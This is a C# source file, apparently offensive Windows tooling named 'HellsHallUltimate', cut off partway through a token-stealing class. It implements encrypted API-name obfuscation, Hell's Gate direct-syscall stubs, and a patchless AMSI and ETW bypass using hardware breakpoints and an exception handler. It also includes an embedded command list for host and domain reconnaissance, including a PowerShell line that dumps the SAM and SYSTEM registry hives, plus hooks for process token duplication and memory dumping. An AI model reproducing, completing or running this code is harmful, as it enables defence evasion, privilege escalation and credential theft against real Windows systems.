using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.Win32.SafeHandles;
using System.Collections.Generic;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Linq;
using Microsoft.Win32;

namespace HellsHallUltimate
{
    #region AES-256 Militärische Verschlüsselung
    public static class MilitaryCrypto
    {
        private static readonly byte[] _key;
        private static readonly byte[] _iv;
        
        static MilitaryCrypto()
        {
            string systemKey = Environment.MachineName + Environment.ProcessorCount.ToString() + 
                               Environment.UserName + Environment.OSVersion.VersionString +
                               Environment.SystemDirectory + Environment.TickCount.ToString();
            
            using (SHA256 sha256 = SHA256.Create())
            {
                _key = sha256.ComputeHash(Encoding.UTF8.GetBytes(systemKey + "HELLSHALL_POOLPARTY_2024"));
                _iv = sha256.ComputeHash(Encoding.UTF8.GetBytes(systemKey + "IV_VECTOR_POOL_2024")).Take(16).ToArray();
            }
        }
        
        public static string Encrypt(string plainText)
        {
            if (string.IsNullOrEmpty(plainText)) return plainText;
            
            using (Aes aes = Aes.Create())
            {
                aes.Key = _key;
                aes.IV = _iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                
                using (var encryptor = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                {
                    byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
                    cs.Write(plainBytes, 0, plainBytes.Length);
                    cs.FlushFinalBlock();
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }
        
        public static string Decrypt(string cipherText)
        {
            if (string.IsNullOrEmpty(cipherText)) return cipherText;
            
            try
            {
                using (Aes aes = Aes.Create())
                {
                    aes.Key = _key;
                    aes.IV = _iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    using (var decryptor = aes.CreateDecryptor())
                    using (var ms = new MemoryStream(Convert.FromBase64String(cipherText)))
                    using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    using (var sr = new StreamReader(cs))
                    {
                        return sr.ReadToEnd();
                    }
                }
            }
            catch { return cipherText; }
        }
    }
    
    public static class StringObfuscator
    {
        public static string Obfuscate(string input) => MilitaryCrypto.Encrypt(input);
        public static string Deobfuscate(string input) => MilitaryCrypto.Decrypt(input);
    }
    #endregion

    #region Native Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags, MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15, Rip;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_RECORD
    {
        public uint ExceptionCode;
        public uint ExceptionFlags;
        public IntPtr ExceptionRecord;
        public IntPtr ExceptionAddress;
        public uint NumberParameters;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
        public ulong[] ExceptionInformation;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_POINTERS
    {
        public IntPtr ExceptionRecord;
        public IntPtr ContextRecord;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;

        public static OBJECT_ATTRIBUTES Create()
        {
            return new OBJECT_ATTRIBUTES { Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)) };
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
    #endregion

    #region Constants
    public static class Constants
    {
        public const uint CONTEXT_DEBUG_REGISTERS = 0x10010;
        public const uint STATUS_SINGLE_STEP = 0x80000004;
        public const uint EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF;
        public const uint EXCEPTION_CONTINUE_SEARCH = 0x0;
        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
        public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
        public const uint PROCESS_DUP_HANDLE = 0x0040;
        public const uint PROCESS_VM_READ = 0x0010;
        public const uint PROCESS_VM_WRITE = 0x0020;
        public const uint PROCESS_VM_OPERATION = 0x0008;
        public const uint PROCESS_ALL_ACCESS = 0x1FFFFF;
        public const uint TOKEN_DUPLICATE = 0x0002;
        public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const uint TOKEN_QUERY = 0x0008;
        public const uint TOKEN_IMPERSONATE = 0x0004;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const uint TOKEN_ALL_ACCESS = 0xF01FF;
        public const int TokenPrimary = 1;
        public const int SecurityDelegation = 3;
        public const uint SE_PRIVILEGE_ENABLED = 0x2;
        public const short SW_HIDE = 0;
        public const uint STARTF_USESTDHANDLES = 0x00000100;
        public const uint STARTF_USESHOWWINDOW = 0x00000001;
        public const uint CREATE_NO_WINDOW = 0x08000000;
        public const int BUFFER_SIZE = 65536;
        public const uint MEM_COMMIT = 0x1000;
        public const uint MEM_RESERVE = 0x2000;
        public const uint MEM_RELEASE = 0x8000;
        public const uint PAGE_READWRITE = 0x04;
        public const uint PAGE_EXECUTE_READ = 0x20;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint TOKEN_INFORMATION_CLASS_SESSIONID = 12;
        public const uint TOKEN_INFORMATION_CLASS_ELEVATION = 20;
        public const uint TOKEN_INFORMATION_CLASS_INTEGRITY_LEVEL = 25;
        public const int MINIDUMP_WITH_FULL_MEMORY = 2;
        public const int POOL_PARTY_SIZE = 4096;
    }
    #endregion

    #region Verschlüsselte Strings
    public static class EncryptedStrings
    {
        public static readonly string Ntdll = StringObfuscator.Obfuscate("ntdll.dll");
        public static readonly string Kernel32 = StringObfuscator.Obfuscate("kernel32.dll");
        public static readonly string Advapi32 = StringObfuscator.Obfuscate("advapi32.dll");
        public static readonly string User32 = StringObfuscator.Obfuscate("user32.dll");
        public static readonly string DbgHelp = StringObfuscator.Obfuscate("DbgHelp.dll");
        
        public static readonly string NtContinue = StringObfuscator.Obfuscate("NtContinue");
        public static readonly string NtCreateFile = StringObfuscator.Obfuscate("NtCreateFile");
        public static readonly string NtOpenProcess = StringObfuscator.Obfuscate("NtOpenProcess");
        public static readonly string NtOpenProcessToken = StringObfuscator.Obfuscate("NtOpenProcessToken");
        public static readonly string NtDuplicateToken = StringObfuscator.Obfuscate("NtDuplicateToken");
        public static readonly string NtClose = StringObfuscator.Obfuscate("NtClose");
        public static readonly string AmsiScanBuffer = StringObfuscator.Obfuscate("AmsiScanBuffer");
        public static readonly string EtwEventWrite = StringObfuscator.Obfuscate("EtwEventWrite");
        public static readonly string Amsi = StringObfuscator.Obfuscate("amsi.dll");
        
        public static readonly string OpenProcessToken = StringObfuscator.Obfuscate("OpenProcessToken");
        public static readonly string DuplicateTokenEx = StringObfuscator.Obfuscate("DuplicateTokenEx");
        public static readonly string LookupPrivilegeValue = StringObfuscator.Obfuscate("LookupPrivilegeValueA");
        public static readonly string AdjustTokenPrivileges = StringObfuscator.Obfuscate("AdjustTokenPrivileges");
        public static readonly string CreateProcessAsUser = StringObfuscator.Obfuscate("CreateProcessAsUserW");
        public static readonly string GetTokenInformation = StringObfuscator.Obfuscate("GetTokenInformation");
        public static readonly string MiniDumpWriteDump = StringObfuscator.Obfuscate("MiniDumpWriteDump");
        
        public static readonly string SeDebugPrivilege = StringObfuscator.Obfuscate("SeDebugPrivilege");
        public static readonly string SeImpersonatePrivilege = StringObfuscator.Obfuscate("SeImpersonatePrivilege");
        public static readonly string SeAssignPrimaryTokenPrivilege = StringObfuscator.Obfuscate("SeAssignPrimaryTokenPrivilege");
        
        public static readonly string[] Commands = new string[]
        {
            StringObfuscator.Obfuscate("systeminfo"),
            StringObfuscator.Obfuscate("hostname"),
            StringObfuscator.Obfuscate("whoami"),
            StringObfuscator.Obfuscate("whoami /priv"),
            StringObfuscator.Obfuscate("whoami /groups"),
            StringObfuscator.Obfuscate("ipconfig /all"),
            StringObfuscator.Obfuscate("netstat -an"),
            StringObfuscator.Obfuscate("netstat -ano"),
            StringObfuscator.Obfuscate("route print"),
            StringObfuscator.Obfuscate("arp -a"),
            StringObfuscator.Obfuscate("net user"),
            StringObfuscator.Obfuscate("net localgroup"),
            StringObfuscator.Obfuscate("net group /domain"),
            StringObfuscator.Obfuscate("net accounts"),
            StringObfuscator.Obfuscate("tasklist"),
            StringObfuscator.Obfuscate("tasklist /svc"),
            StringObfuscator.Obfuscate("sc query state= all"),
            StringObfuscator.Obfuscate("wmic service list brief"),
            StringObfuscator.Obfuscate("auditpol /get /category:*"),
            StringObfuscator.Obfuscate("wmic qfe list brief /format:table"),
            StringObfuscator.Obfuscate("wmic useraccount get name,sid"),
            StringObfuscator.Obfuscate("wmic group get name,sid"),
            StringObfuscator.Obfuscate("net user /domain"),
            StringObfuscator.Obfuscate("reg query HKLM\\SAM\\SAM\\Domains\\Account\\Users"),
            StringObfuscator.Obfuscate("powershell -ExecutionPolicy Bypass -Command \"$_SAM = '.\\sam_neu.hiv'; $_SYS = '.\\system_neu.hiv'; reg save HKLM\\SAM $_SAM /y >$null 2>&1; reg save HKLM\\SYSTEM $_SYS /y >$null 2>&1; if (Test-Path $_SAM) { Write-Host '--- SAM erfolgreich gesichert! ---' -ForegroundColor Green; Write-Host 'Dateien: sam_neu.hiv und system_neu.hiv erstellt'; } else { Write-Host 'FEHLER: SAM konnte nicht gesichert werden!' -ForegroundColor Red; }\"")
        };
        
        public static readonly string[] CommandNames = new string[]
        {
            StringObfuscator.Obfuscate("01_Systeminfo"),
            StringObfuscator.Obfuscate("02_Hostname"),
            StringObfuscator.Obfuscate("03_Whoami"),
            StringObfuscator.Obfuscate("04_Privileges"),
            StringObfuscator.Obfuscate("05_Groups"),
            StringObfuscator.Obfuscate("06_IPConfig"),
            StringObfuscator.Obfuscate("07_Netstat_All"),
            StringObfuscator.Obfuscate("08_Netstat_PIDs"),
            StringObfuscator.Obfuscate("09_Route_Table"),
            StringObfuscator.Obfuscate("10_ARP_Table"),
            StringObfuscator.Obfuscate("11_Local_Users"),
            StringObfuscator.Obfuscate("12_Local_Groups"),
            StringObfuscator.Obfuscate("13_Domain_Groups"),
            StringObfuscator.Obfuscate("14_Account_Policies"),
            StringObfuscator.Obfuscate("15_Processes"),
            StringObfuscator.Obfuscate("16_Processes_Services"),
            StringObfuscator.Obfuscate("17_Services"),
            StringObfuscator.Obfuscate("18_Services_WMIC"),
            StringObfuscator.Obfuscate("19_Audit_Policies"),
            StringObfuscator.Obfuscate("20_Hotfixes"),
            StringObfuscator.Obfuscate("21_All_Users"),
            StringObfuscator.Obfuscate("22_All_Groups"),
            StringObfuscator.Obfuscate("23_Domain_Users"),
            StringObfuscator.Obfuscate("24_SAM_Users"),
            StringObfuscator.Obfuscate("25_PowerShell_SAM_Extractor")
        };
    }
    #endregion

    #region Win32 Native API
    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool RemoveVectoredExceptionHandler(IntPtr Handle);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);
        
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ShowWindow(IntPtr hWnd, short nCmdShow);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtContinue(ref CONTEXT Context, int TestAlert);
        
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtClose(IntPtr Handle);
        
        [DllImport("DbgHelp.dll", SetLastError = true)]
        public static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, SafeFileHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_INFO
    {
        public ushort ProcessorArchitecture;
        public ushort Reserved;
        public uint PageSize;
        public IntPtr MinimumApplicationAddress;
        public IntPtr MaximumApplicationAddress;
        public IntPtr ActiveProcessorMask;
        public uint NumberOfProcessors;
        public uint ProcessorType;
        public uint AllocationGranularity;
        public ushort ProcessorLevel;
        public ushort ProcessorRevision;
    }
    #endregion

    #region NtSyscall Delegates
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int NtOpenProcessDelegate(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int NtOpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int NtDuplicateTokenDelegate(IntPtr ExistingTokenHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, uint TokenType, out IntPtr NewTokenHandle);
    #endregion

    #region PoolParty Memory Management
    public static class PoolParty
    {
        private static List<IntPtr> _allocatedPools = new List<IntPtr>();
        private static Random _random = new Random();
        private static SYSTEM_INFO _sysInfo;
        
        public static void Initialize()
        {
            Console.WriteLine("[POOLPARTY] Initializing memory pool...");
            
            NativeApi.GetSystemInfo(out _sysInfo);
            
            // PoolParty: Allocate multiple memory pools at different addresses
            for (int i = 0; i < Constants.POOL_PARTY_SIZE / 64; i++)
            {
                int size = _random.Next(64, 4096);
                IntPtr pool = NativeApi.VirtualAlloc(IntPtr.Zero, (uint)size, Constants.MEM_COMMIT | Constants.MEM_RESERVE, Constants.PAGE_READWRITE);
                if (pool != IntPtr.Zero)
                {
                    _allocatedPools.Add(pool);
                    // Fill with random data
                    byte[] randomData = new byte[size];
                    _random.NextBytes(randomData);
                    Marshal.Copy(randomData, 0, pool, size);
                }
            }
            
            Console.WriteLine($"[POOLPARTY] Allocated {_allocatedPools.Count} memory pools");
        }
        
        public static void RandomizeExecution()
        {
            int delay = _random.Next(50, 250);
            Thread.Sleep(delay);
        }
        
        public static IntPtr AllocateObfuscatedStub(byte[] stubCode)
        {
            IntPtr stubMemory = NativeApi.VirtualAlloc(IntPtr.Zero, (uint)stubCode.Length, Constants.MEM_COMMIT | Constants.MEM_RESERVE, Constants.PAGE_READWRITE);
            if (stubMemory != IntPtr.Zero)
            {
                Marshal.Copy(stubCode, 0, stubMemory, stubCode.Length);
                uint oldProtect;
                NativeApi.VirtualProtect(stubMemory, (uint)stubCode.Length, Constants.PAGE_EXECUTE_READ, out oldProtect);
                _allocatedPools.Add(stubMemory);
            }
            return stubMemory;
        }
        
        public static void Cleanup()
        {
            foreach (var pool in _allocatedPools)
            {
                NativeApi.VirtualFree(pool, 0, Constants.MEM_RELEASE);
            }
            _allocatedPools.Clear();
            Console.WriteLine("[POOLPARTY] Cleaned up memory pools");
        }
    }
    #endregion

    #region HellsGate Syscall Engine
    public static class HellsGate
    {
        private static Dictionary<string, IntPtr> _syscallStubs = new Dictionary<string, IntPtr>();
        
        public static unsafe uint ExtractSSN(IntPtr functionAddress)
        {
            byte* addr = (byte*)functionAddress.ToPointer();
            if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8)
                return *(uint*)(addr + 4);
            return 0;
        }
        
        public static unsafe IntPtr FindSyscallInstruction(IntPtr functionAddress)
        {
            byte* addr = (byte*)functionAddress.ToPointer();
            for (int i = 0; i < 32; i++)
                if (addr[i] == 0x0F && addr[i + 1] == 0x05)
                    return new IntPtr(addr + i);
            return IntPtr.Zero;
        }
        
        public static IntPtr CreateSyscallStub(uint ssn, IntPtr landingPad = default)
        {
            byte[] stub;
            if (landingPad == IntPtr.Zero)
            {
                stub = new byte[]
                {
                    0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                    0x4C, 0x8B, 0xD1, 0x0F, 0x05, 0xC3
                };
            }
            else
            {
                stub = new byte[]
                {
                    0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                    0x4C, 0x8B, 0xD1, 0x48, 0xB8,
                    (byte)((ulong)landingPad & 0xFF), (byte)(((ulong)landingPad >> 8) & 0xFF),
                    (byte)(((ulong)landingPad >> 16) & 0xFF), (byte)(((ulong)landingPad >> 24) & 0xFF),
                    (byte)(((ulong)landingPad >> 32) & 0xFF), (byte)(((ulong)landingPad >> 40) & 0xFF),
                    (byte)(((ulong)landingPad >> 48) & 0xFF), (byte)(((ulong)landingPad >> 56) & 0xFF),
                    0xFF, 0xE0, 0xC3
                };
            }
            
            return PoolParty.AllocateObfuscatedStub(stub);
        }
        
        public static void Cleanup()
        {
            _syscallStubs.Clear();
        }
    }
    #endregion

    #region HellsHall Core - Patchless Bypass mit VEH und NtContinue
    public static class HellsHallCore
    {
        private static uint _ntContinueSSN;
        private static IntPtr _ntContinueSyscallAddr;
        private static IntPtr _vehHandle;
        private static IntPtr _amsiAddr;
        private static IntPtr _etwAddr;
        
        private static void Log(string message)
        {
            try { Console.WriteLine(message); } catch { }
        }
        
        private static unsafe IntPtr FindSyscallLandingPad()
        {
            IntPtr ntdll = NativeApi.GetModuleHandle(StringObfuscator.Deobfuscate(EncryptedStrings.Ntdll));
            if (ntdll == IntPtr.Zero) return IntPtr.Zero;
            
            try
            {
                byte[] ntdllCode = new byte[8192];
                Marshal.Copy(ntdll, ntdllCode, 0, ntdllCode.Length);
                
                for (int i = 0; i < ntdllCode.Length - 10; i++)
                {
                    if (ntdllCode[i] == 0x0F && ntdllCode[i + 1] == 0x05 && ntdllCode[i + 2] == 0xC3)
                    {
                        return IntPtr.Add(ntdll, i);
                    }
                }
            }
            catch { }
            return IntPtr.Zero;
        }
        
        private static void ResolveSyscalls()
        {
            IntPtr ntdll = NativeApi.GetModuleHandle(StringObfuscator.Deobfuscate(EncryptedStrings.Ntdll));
            if (ntdll == IntPtr.Zero) return;
            
            IntPtr ntContinueAddr = NativeApi.GetProcAddress(ntdll, StringObfuscator.Deobfuscate(EncryptedStrings.NtContinue));
            if (ntContinueAddr != IntPtr.Zero)
            {
                _ntContinueSSN = HellsGate.ExtractSSN(ntContinueAddr);
                _ntContinueSyscallAddr = HellsGate.FindSyscallInstruction(ntContinueAddr);
                Log($"[HELLSHALL] NtContinue SSN: 0x{_ntContinueSSN:X2}");
            }
            
            IntPtr amsi = NativeApi.GetModuleHandle(StringObfuscator.Deobfuscate(EncryptedStrings.Amsi));
            if (amsi != IntPtr.Zero)
                _amsiAddr = NativeApi.GetProcAddress(amsi, StringObfuscator.Deobfuscate(EncryptedStrings.AmsiScanBuffer));
            
            _etwAddr = NativeApi.GetProcAddress(ntdll, StringObfuscator.Deobfuscate(EncryptedStrings.EtwEventWrite));
        }
        
        private static unsafe void SetHardwareBreakpoints()
        {
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = Constants.CONTEXT_DEBUG_REGISTERS;
            
            if (_amsiAddr != IntPtr.Zero)
                ctx.Dr0 = (ulong)_amsiAddr;
            if (_etwAddr != IntPtr.Zero)
                ctx.Dr1 = (ulong)_etwAddr;
            
            ctx.Dr7 = (_amsiAddr != IntPtr.Zero ? 0x1u : 0u) | (_etwAddr != IntPtr.Zero ? 0x4u : 0u);
            
            IntPtr landingPad = FindSyscallLandingPad();
            IntPtr stubMemory = HellsGate.CreateSyscallStub(_ntContinueSSN, landingPad);
            if (stubMemory != IntPtr.Zero)
            {
                var stubDelegate = Marshal.GetDelegateForFunctionPointer<NtContinueStubDelegate>(stubMemory);
                stubDelegate(ref ctx, 0);
            }
            
            Log("[HELLSHALL] Hardware breakpoints set via NtContinue");
        }
        
        private delegate uint VectoredExceptionDelegate(IntPtr exceptionPointers);
        private delegate int NtContinueStubDelegate(ref CONTEXT context, int testAlert);
        
        private static uint ExceptionHandler(IntPtr exceptionPointers)
        {
            EXCEPTION_POINTERS ep = Marshal.PtrToStructure<EXCEPTION_POINTERS>(exceptionPointers);
            EXCEPTION_RECORD er = Marshal.PtrToStructure<EXCEPTION_RECORD>(ep.ExceptionRecord);
            
            if (er.ExceptionCode == Constants.STATUS_SINGLE_STEP)
            {
                CONTEXT ctx = Marshal.PtrToStructure<CONTEXT>(ep.ContextRecord);
                
                if ((_amsiAddr != IntPtr.Zero && ctx.Rip == (ulong)_amsiAddr) ||
                    (_etwAddr != IntPtr.Zero && ctx.Rip == (ulong)_etwAddr))
                {
                    ctx.Rax = 0x00000000;
                    ctx.Rip = FindRetGadget(ctx.Rip);
                    ctx.EFlags |= (1 << 16);
                    Marshal.StructureToPtr(ctx, ep.ContextRecord, false);
                    return Constants.EXCEPTION_CONTINUE_EXECUTION;
                }
            }
            return Constants.EXCEPTION_CONTINUE_SEARCH;
        }
        
        private static unsafe ulong FindRetGadget(ulong nearAddress)
        {
            byte* addr = (byte*)nearAddress;
            for (int i = 0; i < 0x10000; i++)
                if (addr[i] == 0xC3) return nearAddress + (ulong)i;
            return nearAddress + 5;
        }
        
        public static void Initialize()
        {
            Log("[HELLSHALL] Initializing Patchless Bypass with VEH and NtContinue...");
            
            ResolveSyscalls();
            if (_ntContinueSSN == 0) return;
            
            var vehDelegate = new VectoredExceptionDelegate(ExceptionHandler);
            IntPtr vehPtr = Marshal.GetFunctionPointerForDelegate(vehDelegate);
            _vehHandle = NativeApi.AddVectoredExceptionHandler(1, vehPtr);
            GC.KeepAlive(vehDelegate);
            
            SetHardwareBreakpoints();
            
            Log("[HELLSHALL] Patchless Bypass initialized successfully");
        }
        
        public static void Cleanup()
        {
            if (_vehHandle != IntPtr.Zero)
                NativeApi.RemoveVectoredExceptionHandler(_vehHandle);
            
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = Constants.CONTEXT_DEBUG_REGISTERS;
            ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
            ctx.Dr7 = 0;
            NativeApi.NtContinue(ref ctx, 0);
            
            Log("[HELLSHALL] Cleanup completed - Hardware breakpoints cleared");
        }
    }
    #endregion

    #region Token Helper
    public static class TokenHelper
    {
        public static int GetTokenSessionId(IntPtr hToken)
        {
            uint dwLen = 0;
            NativeApi.GetTokenInformation(hToken, Constants.TOKEN_INFORMATION_CLASS_SESSIONID, IntPtr.Zero, 0, out dwLen);
            if (dwLen > 0)
            {
                IntPtr pSessionId = Marshal.AllocHGlobal((int)dwLen);
                try
                {
                    if (NativeApi.GetTokenInformation(hToken, Constants.TOKEN_INFORMATION_CLASS_SESSIONID, pSessionId, dwLen, out dwLen))
                        return Marshal.ReadInt32(pSessionId);
                }
                finally { Marshal.FreeHGlobal(pSessionId); }
            }
            return -1;
        }
        
        public static bool IsTokenElevated(IntPtr hToken)
        {
            uint dwLen = 0;
            NativeApi.GetTokenInformation(hToken, Constants.TOKEN_INFORMATION_CLASS_ELEVATION, IntPtr.Zero, 0, out dwLen);
            if (dwLen > 0)
            {
                IntPtr pElev = Marshal.AllocHGlobal((int)dwLen);
                try
                {
                    if (NativeApi.GetTokenInformation(hToken, Constants.TOKEN_INFORMATION_CLASS_ELEVATION, pElev, dwLen, out dwLen))
                        return Marshal.ReadInt32(pElev) != 0;
                }
                finally { Marshal.FreeHGlobal(pElev); }
            }
            return false;
        }
        
        public static int GetTokenIntegrityLevel(IntPtr hToken)
        {
            uint dwLen = 0;
            NativeApi.GetTokenInformation(hToken, Constants.TOKEN_INFORMATION_CLASS_INTEGRITY_LEVEL, IntPtr.Zero, 0, out dwLen);
            if (dwLen > 0)
            {
                IntPtr pTIL = Marshal.AllocHGlobal((int)dwLen);
                try
                {
                    if (NativeApi.GetTokenInformation(hToken, Constants.TOKEN_INFORMATION_CLASS_INTEGRITY_LEVEL, pTIL, dwLen, out dwLen))
                    {
                        IntPtr pSid = Marshal.ReadIntPtr(pTIL);
                        if (pSid != IntPtr.Zero)
                        {
                            byte subAuthorityCount = Marshal.ReadByte(pSid, 1);
                            if (subAuthorityCount > 0)
                            {
                                return Marshal.ReadInt32(pSid, 8 + (subAuthorityCount - 1) * 4);
                            }
                        }
                    }
                }
                finally { Marshal.FreeHGlobal(pTIL); }
            }
            return 0;
        }
    }
    #endregion

    #region Token Theft mit NtSyscalls
    public static class TokenStealer
    {
        private static NtOpenProcessDelegate _ntOpenProcess;
        private static NtOpenProcessTokenDelegate _ntOpenProcessToken;
        private static NtDuplicateTokenDelegate _ntDuplicateToken;
        
        private static void InitializeSyscalls()
        {
            IntPtr ntdll = NativeApi.GetModuleHandle(StringObfuscator.Deobfuscate(EncryptedStrings.Ntdll));
            if (ntdll == IntPtr.Zero) return;
            
            IntPtr pNtOpenProcess = NativeApi.GetProcAddress(ntdll, StringObfuscator.Deobfuscate(EncryptedStrings.NtOpenProcess));
            if (pNtOpenProcess != IntPtr.Zero)
                _ntOpenProcess = Marshal.GetDelegateForFunctionPointer<NtOpenProcessDelegate>(pNtOpenProcess);
            
            IntPtr pNtOpenProcessToken = NativeApi.GetProcAddress(ntdll, StringObfuscator.Deobfuscate(EncryptedStrings.NtOpenProcessToken));
            if (pNtOpenProcessToken != IntPtr.Zero)
